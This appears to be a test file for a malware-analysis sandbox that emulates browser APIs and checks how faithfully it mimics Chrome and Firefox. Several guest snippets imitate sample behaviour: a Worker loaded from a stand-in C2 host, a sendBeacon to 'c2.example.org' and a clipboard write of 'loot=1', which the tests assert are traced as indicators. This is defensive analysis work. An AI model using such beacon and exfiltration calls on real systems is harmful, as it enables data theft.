import test, { after, before } from 'node:test'
import assert from 'node:assert/strict'

import { createHarness } from './helpers/harness.js'

/**
 * Environment tests for `tools/sandbox/env/misc.js` and `env/chrome.js`.
 *
 * The harness installs the real bridge, stealth masker and virtual clock, so
 * these tests exercise the same code path an analysis run does. `navigator` is
 * installed explicitly because `misc` augments the already-installed surface
 * rather than creating a second one.
 */

const MODULES = ['globals', 'console', 'timers', 'storage', 'navigator', 'misc', 'chrome']

/** @type {object} */
let chromium
/** @type {object} */
let firefox

before(async () => {
  chromium = await createHarness({ modules: MODULES, profile: { browser: 'chrome', os: 'windows' } })
  firefox = await createHarness({ modules: MODULES, profile: { browser: 'firefox', os: 'linux' } })
})

after(() => {
  chromium?.dispose()
  firefox?.dispose()
})

/**
 * Evaluate guest code, failing the test with the guest error message.
 * @param {object} harness
 * @param {string} code
 */
function guest(harness, code) {
  const result = harness.run(code)
  assert.equal(result.ok, true, result.ok ? '' : `${result.error?.name}: ${result.error?.message}`)
  return result.value
}

/** Run due virtual timers and drain the promise job queue. */
function pump(harness) {
  const timers = harness.timers()
  assert.deepEqual(timers.errors, [])
  assert.equal(harness.jobs().ok, true)
}

/**
 * Run `code`, which settles `globalThis[name]` asynchronously, then return the
 * settled value. Async platform results are tapped through the guest so the
 * assertion checks exactly what a sample would observe.
 * @param {object} harness
 * @param {string} name guest global to read back
 * @param {string} code guest statements that settle the global
 */
function settle(harness, name, code) {
  guest(harness, `globalThis.${name} = 'pending'; ${code}; 0`)
  pump(harness)
  return guest(harness, name)
}

test('URL parses, formats and exposes browser components', () => {
  const parts = guest(
    chromium,
    `(function () {
      var u = new URL('https://user:pass@sub.example-cdn.com:8443/a/b?x=1&y=2#frag');
      return [u.href, u.origin, u.protocol, u.username, u.password, u.host, u.hostname,
        u.port, u.pathname, u.search, u.hash, u.toString(), u.toJSON()];
    })()`,
  )
  assert.deepEqual(parts.slice(0, 11), [
    'https://user:pass@sub.example-cdn.com:8443/a/b?x=1&y=2#frag',
    'https://sub.example-cdn.com:8443',
    'https:',
    'user',
    'pass',
    'sub.example-cdn.com:8443',
    'sub.example-cdn.com',
    '8443',
    '/a/b',
    '?x=1&y=2',
    '#frag',
  ])
  assert.equal(parts[11], parts[0])
  assert.equal(parts[12], parts[0])

  assert.deepEqual(
    guest(chromium, `[new URL('x/y', 'https://a.test/b/c').href, new URL('/root', 'https://a.test/b/c').href]`),
    ['https://a.test/b/x/y', 'https://a.test/root'],
  )

  assert.deepEqual(guest(chromium, `[URL.canParse('https://a.test/'), URL.canParse('/x'), URL.canParse('/x', 'https://a.test/')]`), [
    true,
    false,
    true,
  ])

  assert.deepEqual(
    guest(chromium, `(function () {
      try { new URL('not a url') } catch (e) { return [e.name, e.message, e instanceof TypeError] }
      return null;
    })()`),
    ['TypeError', 'Invalid URL', true],
  )

  assert.equal(guest(chromium, `Object.getOwnPropertyNames(new URL('https://a.test/')).length`), 0)
})

test('URL keeps searchParams live in both directions', () => {
  const params = guest(
    chromium,
    `(function () {
      var u = new URL('https://a.test/p?a=1&b=2');
      var p = u.searchParams;
      return [p instanceof URLSearchParams, p === u.searchParams, p.size, p.get('a')];
    })()`,
  )
  assert.deepEqual(params, [true, true, 2, '1'])

  const live = guest(
    chromium,
    `(function () {
      var u = new URL('https://a.test/p?a=1');
      u.search = '?z=9';
      var afterSearch = [u.href, u.searchParams.get('z')];
      u.searchParams.set('q', '5');
      return afterSearch.concat([u.href, u.searchParams.size]);
    })()`,
  )
  assert.deepEqual(live, ['https://a.test/p?z=9', '9', 'https://a.test/p?z=9&q=5', 2])
})

test('URLSearchParams supports query operations and iteration', () => {
  const result = guest(
    chromium,
    `(function () {
      var p = new URLSearchParams('a=1&b=2&a=3');
      var before = [p.get('a'), p.getAll('a'), p.has('b'), p.size];
      p.append('c', '4');
      p.set('a', '9');
      p.delete('b');
      p.sort();
      var visited = [];
      p.forEach(function (value, key, parent) { visited.push(key + '=' + value + ':' + (parent === p)) });
      return {
        before: before,
        sorted: p.toString(),
        keys: [...p.keys()],
        values: [...p.values()],
        entries: [...p.entries()],
        visited: visited,
        pairs: new URLSearchParams([['x', '1'], ['y', '2']]).toString(),
      };
    })()`,
  )
  assert.deepEqual(result.before, ['1', ['1', '3'], true, 3])
  assert.equal(result.sorted, 'a=9&c=4')
  assert.deepEqual(result.keys, ['a', 'c'])
  assert.deepEqual(result.values, ['9', '4'])
  assert.deepEqual(result.entries, [
    ['a', '9'],
    ['c', '4'],
  ])
  assert.deepEqual(result.visited, ['a=9:true', 'c=4:true'])
  assert.equal(result.pairs, 'x=1&y=2')

  assert.equal(
    guest(
      chromium,
      `(function () {
        try { URLSearchParams.prototype.get.call({}) } catch (e) { return e.name + ':' + e.message }
        return '';
      })()`,
    ),
    'TypeError:Illegal invocation',
  )
})

test('Blob and File expose real bytes and metadata', () => {
  assert.deepEqual(
    guest(
      chromium,
      `(function () {
        var b = new Blob(['hello ', 'world'], { type: 'TEXT/Plain' });
        return [b.size, b.type, b instanceof Blob, Object.prototype.toString.call(b)];
      })()`,
    ),
    [11, 'text/plain', true, '[object Blob]'],
  )

  assert.equal(
    settle(chromium, '__blobText', `new Blob(['hello ', 'world']).text().then(function (t) { globalThis.__blobText = t })`),
    'hello world',
  )
  assert.deepEqual(
    settle(
      chromium,
      '__blobBytes',
      `new Blob([new Uint8Array([65, 66, 67])]).arrayBuffer().then(function (buf) {
        var bytes = new Uint8Array(buf);
        globalThis.__blobBytes = [bytes.length, bytes[0], bytes[2]];
      })`,
    ),
    [3, 65, 67],
  )
  assert.equal(
    settle(chromium, '__blobSlice', `new Blob(['abcdef']).slice(1, 4).text().then(function (t) { globalThis.__blobSlice = t })`),
    'bcd',
  )

  assert.deepEqual(
    guest(
      chromium,
      `(function () {
        var f = new File(['abc'], 'evil.bin', { type: 'application/octet-stream', lastModified: 1234 });
        return [f.name, f.size, f.type, f.lastModified, f.webkitRelativePath, f instanceof Blob,
          Object.prototype.toString.call(f)];
      })()`,
    ),
    ['evil.bin', 3, 'application/octet-stream', 1234, '', true, '[object File]'],
  )
})

test('FormData stores entries in order and returns the appended blob', () => {
  const form = guest(
    chromium,
    `(function () {
      var fd = new FormData();
      fd.append('a', '1');
      fd.append('b', '2');
      fd.set('a', '3');
      var blob = new Blob(['x'], { type: 'text/plain' });
      fd.append('file', blob);
      return {
        get: fd.get('a'),
        all: fd.getAll('a'),
        has: fd.has('b'),
        keys: [...fd.keys()],
        first: fd.entries().next().value,
        sameBlob: fd.get('file') === blob,
        blobKind: fd.get('file') instanceof Blob,
      };
    })()`,
  )
  assert.equal(form.get, '3')
  assert.deepEqual(form.all, ['3'])
  assert.equal(form.has, true)
  assert.deepEqual(form.keys, ['a', 'b', 'file'])
  assert.deepEqual(form.first, ['a', '3'])
  assert.equal(form.sameBlob, true)
  assert.equal(form.blobKind, true)

  assert.equal(
    guest(chromium, `(function () { var fd = new FormData(); fd.append('x', '1'); fd.delete('x'); return fd.has('x') })()`),
    false,
  )
})

test('AbortController aborts listeners and AbortSignal.timeout fires on the virtual clock', () => {
  const aborted = guest(
    chromium,
    `(function () {
      var controller = new AbortController();
      var signal = controller.signal;
      var seen = 0;
      signal.addEventListener('abort', function () { seen += 1 });
      controller.abort('because');
      var thrown = null;
      try { signal.throwIfAborted() } catch (error) { thrown = error.name }
      return [signal.aborted, signal.reason, seen, signal.onabort, thrown];
    })()`,
  )
  assert.deepEqual(aborted, [true, 'because', 1, null, 'AbortError'])

  guest(
    chromium,
    `globalThis.__timedOut = false;
     globalThis.__timeoutSignal = AbortSignal.timeout(50);
     globalThis.__timeoutSignal.addEventListener('abort', function () { globalThis.__timedOut = true }); 0`,
  )
  assert.equal(guest(chromium, 'globalThis.__timeoutSignal.aborted'), false)
  pump(chromium)
  assert.equal(guest(chromium, 'globalThis.__timedOut'), true)
  assert.equal(guest(chromium, 'globalThis.__timeoutSignal.aborted'), true)
})

test('navigator permissions, battery and devices come from the profile', () => {
  assert.equal(guest(chromium, `typeof navigator.permissions.addEventListener`), 'function')
  assert.deepEqual(
    settle(
      chromium,
      '__permission',
      `navigator.permissions.query({ name: 'notifications' }).then(function (status) {
        globalThis.__permission = [status.state, status.name, status.onchange];
      })`,
    ),
    ['prompt', 'notifications', null],
  )
  assert.equal(
    settle(
      chromium,
      '__geoPermission',
      `navigator.permissions.query({ name: 'geolocation' }).then(function (status) {
        globalThis.__geoPermission = status.state;
      })`,
    ),
    'prompt',
  )

  const battery = settle(
    chromium,
    '__battery',
    `navigator.getBattery().then(function (b) {
      globalThis.__battery = [b.charging, b.level, b.chargingTime, b.dischargingTime];
    })`,
  )
  // JSON transport turns non-finite numbers into null; browsers expose
  // Infinity for the irrelevant time field.
  const jsonSafe = (value) => (Number.isFinite(value) ? value : null)
  assert.deepEqual(battery, [
    chromium.profile.battery.charging,
    chromium.profile.battery.level,
    jsonSafe(chromium.profile.battery.chargingTime),
    jsonSafe(chromium.profile.battery.dischargingTime),
  ])

  assert.deepEqual(
    settle(
      chromium,
      '__devices',
      `navigator.mediaDevices.enumerateDevices().then(function (list) {
        globalThis.__devices = [list.length, list[0].kind];
      })`,
    ),
    [chromium.profile.mediaDevices.length, 'audioinput'],
  )

  const denial = settle(
    chromium,
    '__mediaError',
    `navigator.mediaDevices.getUserMedia({ video: true }).then(null, function (error) {
      globalThis.__mediaError = [error.name, error.message];
    })`,
  )
  assert.deepEqual(denial, ['NotAllowedError', 'Permission denied'])

  assert.equal(
    settle(
      chromium,
      '__geolocationError',
      `navigator.geolocation.getCurrentPosition(null, function (error) {
        globalThis.__geolocationError = error.code + ':' + error.message;
      })`,
    ),
    '1:User denied Geolocation',
  )

  assert.deepEqual(guest(chromium, `[navigator.connection.effectiveType, navigator.connection.rtt, navigator.connection.saveData]`), [
    '4g',
    50,
    false,
  ])
})

test('Notification, workers, channels and structuredClone are present', () => {
  assert.equal(guest(chromium, 'Notification.permission'), chromium.profile.notificationPermission)
  assert.deepEqual(
    guest(
      chromium,
      `[typeof Notification, typeof Worker, typeof SharedWorker, typeof MessageChannel,
        typeof BroadcastChannel, typeof structuredClone, typeof RTCPeerConnection]`,
    ),
    ['function', 'function', 'function', 'function', 'function', 'function', 'function'],
  )

  const clone = guest(
    chromium,
    `(function () {
      var source = { a: 1, list: [1, 2, { b: 'c' }] };
      var copy = structuredClone(source);
      return [copy, copy !== source, copy.list[2] !== source.list[2]];
    })()`,
  )
  assert.deepEqual(clone[0], { a: 1, list: [1, 2, { b: 'c' }] })
  assert.equal(clone[1], true)
  assert.equal(clone[2], true)

  guest(chromium, `var worker = new Worker('https://c2.example.org/worker.js'); worker.postMessage({ stage: 2 }); 0`)
  const post = chromium.trace.events.find((event) => event.kind === 'api' && event.api === 'Worker.postMessage')
  assert.ok(post, 'Worker.postMessage is traced')
  assert.match(post.url, /worker\.js$/)
  assert.match(post.payload, /stage/)

  assert.deepEqual(
    settle(
      chromium,
      '__channelData',
      `var channel = new MessageChannel();
       channel.port1.onmessage = function (event) { globalThis.__channelData = event.data };
       channel.port2.postMessage({ n: 7 }); 0`,
    ),
    { n: 7 },
  )

  assert.deepEqual(
    settle(
      chromium,
      '__broadcast',
      `var sender = new BroadcastChannel('probe');
       var receiver = new BroadcastChannel('probe');
       receiver.onmessage = function (event) {
         globalThis.__broadcast = [event.data.kind, event.data.n, event.origin];
       };
       sender.postMessage({ kind: 'beacon', n: 1 }); 0`,
    ),
    ['beacon', 1, chromium.profile.origin],
  )

  assert.equal(guest(chromium, `navigator.sendBeacon('https://c2.example.org/beacon', 'stage=2')`), true)
  const beacon = chromium.trace.events.find((event) => event.kind === 'api' && event.api === 'navigator.sendBeacon')
  assert.ok(beacon)
  assert.equal(beacon.url, 'https://c2.example.org/beacon')
  assert.ok(chromium.trace.events.some((event) => event.kind === 'ioc' && event.value === 'https://c2.example.org/beacon'))
})

test('clipboard settles promises and records the written payload', () => {
  assert.equal(
    settle(chromium, '__clipboardRead', `navigator.clipboard.readText().then(function (text) { globalThis.__clipboardRead = text })`),
    '',
  )
  assert.equal(
    settle(
      chromium,
      '__clipboardWritten',
      `navigator.clipboard.writeText('loot=1').then(function () { globalThis.__clipboardWritten = 'written' })`,
    ),
    'written',
  )
  assert.ok(chromium.trace.events.some((event) => event.kind === 'ioc' && event.value === 'loot=1'))
})

test('indexedDB and URL.createObjectURL behave like a sandboxed browser', () => {
  guest(
    chromium,
    `var request = indexedDB.open('stage2');
     globalThis.__requestError = null;
     request.onerror = function () { globalThis.__requestError = request.error.name }; 0`,
  )
  pump(chromium)
  assert.equal(guest(chromium, 'globalThis.__requestError'), 'NotSupportedError')

  const objectUrl = guest(chromium, `URL.createObjectURL(new Blob(['payload']))`)
  assert.ok(objectUrl.startsWith(`blob:${chromium.profile.origin}/`), objectUrl)
  assert.equal(guest(chromium, `(function () { URL.revokeObjectURL(${JSON.stringify(objectUrl)}); return 1 })()`), 1)
})

test('chrome is present for Chromium profiles and absent for Firefox', () => {
  assert.equal(guest(chromium, 'typeof window.chrome'), 'object')
  assert.deepEqual(
    guest(
      chromium,
      `(function () {
        var csi = chrome.csi();
        var times = chrome.loadTimes();
        return [typeof csi.onloadT, typeof csi.startE, typeof csi.pageT, typeof csi.tran,
          typeof times.requestTime, typeof times.commitLoadTime, typeof times.finishLoadTime,
          typeof times.firstPaintTime, typeof times.wasFetchedViaSpdy, times.protocolInfo];
      })()`,
    ),
    ['number', 'number', 'number', 'number', 'number', 'number', 'number', 'number', 'boolean', 'h2'],
  )
  assert.deepEqual(
    guest(
      chromium,
      `[chrome.app.isInstalled, chrome.app.getIsInstalled(), chrome.runtime.id === undefined,
        typeof chrome.runtime.connect, typeof chrome.runtime.sendMessage, 'webstore' in window.chrome]`,
    ),
    [false, false, true, 'function', 'function', false],
  )
  assert.deepEqual(guest(chromium, `Object.keys(chrome.csi())`), ['onloadT', 'startE', 'pageT', 'tran'])

  assert.equal(guest(firefox, 'typeof window.chrome'), 'undefined')
  assert.equal(guest(firefox, `'chrome' in window`), false)
  assert.equal(guest(firefox, 'typeof URL'), 'function')
})

test('platform objects are native-branded and leak no host globals', () => {
  assert.equal(guest(chromium, `String(URL).includes('[native code]')`), true)
  assert.equal(guest(chromium, `String(URL.prototype.toString).includes('[native code]')`), true)
  assert.equal(guest(chromium, `String(URLSearchParams.prototype.get).includes('[native code]')`), true)
  assert.equal(guest(chromium, `String(Blob.prototype.text).includes('[native code]')`), true)

  assert.equal(guest(chromium, `Object.getOwnPropertyDescriptor(URL.prototype, 'href').get.name`), 'get href')
  assert.deepEqual(
    guest(
      chromium,
      `[new URL('x', 'https://a/') instanceof URL, new URLSearchParams('a=1') instanceof URLSearchParams,
        new Blob(['x']) instanceof Blob, new AbortController().signal instanceof AbortSignal]`,
    ),
    [true, true, true, true],
  )

  assert.deepEqual(
    guest(chromium, `[typeof process, typeof require, typeof Buffer, typeof module, typeof global]`),
    ['undefined', 'undefined', 'undefined', 'undefined', 'undefined'],
  )
})

test('service worker and legacy window surface follow the profile', () => {
  assert.equal(guest(chromium, `typeof navigator.serviceWorker.register`), 'function')
  assert.deepEqual(
    settle(
      chromium,
      '__registration',
      `navigator.serviceWorker.register('/sw.js').then(function (registration) {
        globalThis.__registration = [registration.scope, registration.active.state, registration.installing,
          typeof registration.addEventListener];
      })`,
    ),
    [`${chromium.profile.origin}/`, 'activated', null, 'function'],
  )
  assert.equal(
    settle(
      chromium,
      '__registrationReady',
      `navigator.serviceWorker.ready.then(function (registration) {
        globalThis.__registrationReady = registration.active.state;
      })`,
    ),
    'activated',
  )
  assert.equal(guest(chromium, 'navigator.serviceWorker.controller'), null)
  assert.equal(guest(firefox, 'typeof navigator.serviceWorker'), 'object')

  assert.deepEqual(
    guest(
      chromium,
      `[typeof window.scrollTo, typeof window.external.AddSearchProvider,
        window.external.IsSearchProviderInstalled('x'), typeof window.webkitURL,
        typeof window.msSaveBlob, navigator.userActivation.isActive, navigator.userActivation.hasBeenActive]`,
    ),
    ['function', 'function', 0, 'function', 'undefined', true, true],
  )
})
